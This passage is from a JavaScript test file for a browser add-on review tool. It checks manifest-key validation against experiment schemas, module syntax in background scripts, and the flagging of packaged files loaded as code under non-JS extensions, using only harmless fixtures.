// path exists. Regression guard for the SCA false positive: as `input: source` the check
// ran over the readable source, the built schema path was absent there, the exemption
// silently returned nothing, and a legitimate experiment key (e.g. calendar_item_action)
// was flagged. Routing it to the XPI (registry `input: xpi`) restores the pairing.
test("unrecognized-manifest-key accepts a key declared by an experiment's bundled schema", () => {
  const manifest = {
    name: "x",
    experiment_apis: { calendar: { schema: "experiments/cal/schema.json" } },
    calendar_item_action: { title: "Do" }, // declared by the schema below
    bogusKey: 1, // genuinely unknown
  };
  const schema = [
    {
      namespace: "manifest",
      types: [
        {
          $extend: "WebExtensionManifest",
          properties: { calendar_item_action: { type: "object" } },
        },
      ],
    },
  ];
  const out = unrecognizedManifestKey.run(
    withManifest({
      addon: {
        manifest,
        files: new Map([
          ["manifest.json", Buffer.from(JSON.stringify(manifest, null, 2))],
          ["experiments/cal/schema.json", Buffer.from(JSON.stringify(schema))],
        ]),
      },
      schema: { validManifestKeys: new Set(["name", "experiment_apis"]) },
    })
  ).findings;
  const items = out.map((f) => f.item);
  assert.ok(!items.includes("calendar_item_action")); // schema-declared -> accepted
  assert.ok(items.includes("bogusKey")); // still flagged
});

// ---- background-module ----
// A background script using static import/export needs the background declared
// "type": "module"; module syntax in a non-background file is ignored.
test("background-module flags module syntax without type: module", () => {
  const n = (code, background) =>
    backgroundModule.run(withManifest(jsCtx(code, { background }))).findings
      .length;
  assert.equal(n('import x from "./y.js";', { scripts: ["f.js"] }), 1);
  assert.equal(n("export const a = 1;", { scripts: ["f.js"] }), 1);
  assert.equal(
    n('import x from "./y.js";', { scripts: ["f.js"], type: "module" }),
    0
  );
  assert.equal(n("console.log(1);", { scripts: ["f.js"] }), 0);
  assert.equal(n('import x from "./y.js";', { scripts: ["other.js"] }), 0);
});

// unrecognized-file-type: the backstop for the JS-corpus suffix list. reachability's
// manifest walk and <script> walk record any LIVE referenced packaged file whose suffix is
// not in RECOGNIZED_EXTS (a file the browser loads but no check could classify); the check
// reports them. input: xpi. A helper builds a routed-to-the-artifact ctx with reachability
// inputs (files + shipped manifest + parsed sources).
const reachCtx = (files, manifest) => {
  const addon = {
    files: new Map(
      Object.entries({
        "manifest.json": JSON.stringify(manifest),
        ...files,
      }).map(([k, v]) => [k, Buffer.from(v)])
    ),
    manifest,
  };
  return withManifest({
    addon,
    jsSources: parsedSources(addon),
    mode: REVIEW_MODE.XPI,
    options: {},
  });
};
const urtFiles = (ctx) =>
  unrecognizedFileType
    .run(ctx)
    .findings.map((f) => f.file)
    .sort();

test("unrecognized-file-type flags a manifest-declared script with an unknown suffix", () => {
  const ctx = reachCtx(
    { "bg.weird": "globalThis.x = 1;" },
    { manifest_version: 3, background: { scripts: ["bg.weird"] } }
  );
  assert.deepEqual(urtFiles(ctx), ["bg.weird"]);
});

// The <script> walk classifies against JS_EXTENSIONS, not RECOGNIZED_EXTS: a <script src>
// loads its target AS CODE whatever the extension, so BOTH an unrecognized suffix (.weird)
// and a recognized-but-non-JS suffix (.txt executed as a script) are flagged - the latter is
// exactly the evasion of hiding JS behind a resource extension.
test("unrecognized-file-type flags a <script src> that is not JS (unknown OR recognized-non-JS)", () => {
  const ctx = reachCtx(
    {
      "bg.js": "globalThis.x = 1;",
      "page.html":
        '<html><body><script src="logic.data"></script><script src="mod.txt"></script><script src="ok.js"></script></body></html>',
      "logic.data": "globalThis.y = 2;",
      "mod.txt": "export const b = 2;",
      "ok.js": "globalThis.z = 3;",
    },
    {
      manifest_version: 3,
      background: { scripts: ["bg.js"] },
      // page.html is a live entry point (an options page), so its <script src> runs.
      options_ui: { page: "page.html" },
    }
  );
  // logic.data + mod.txt flagged (loaded as code, not JS); ok.js is JS, not flagged.
  assert.deepEqual(urtFiles(ctx), ["logic.data", "mod.txt"]);
});

test("unrecognized-file-type does NOT flag recognized resource types", () => {
  const ctx = reachCtx(
    {
      "bg.js": "globalThis.x = 1;",
      "icon.png": "PNG",
      "_locales/en/messages.json": "{}",
      "font.woff2": "FONT",
    },
    {
      manifest_version: 3,
      default_locale: "en",
      background: { scripts: ["bg.js"] },
      icons: { 48: "icon.png" },
    }
  );
  assert.deepEqual(urtFiles(ctx), []);
});

test("unrecognized-file-type does NOT flag a script in a DEAD (unreachable) page", () => {
  // dead.html is referenced by nothing, so it never loads - its <script src> never runs.
  const ctx = reachCtx(
    {
      "bg.js": "globalThis.x = 1;",
      "dead.html": '<html><body><script src="x.data"></script></body></html>',
      "x.data": "globalThis.y = 2;",
    },
    { manifest_version: 3, background: { scripts: ["bg.js"] } }
  );
  assert.deepEqual(urtFiles(ctx), []);
});
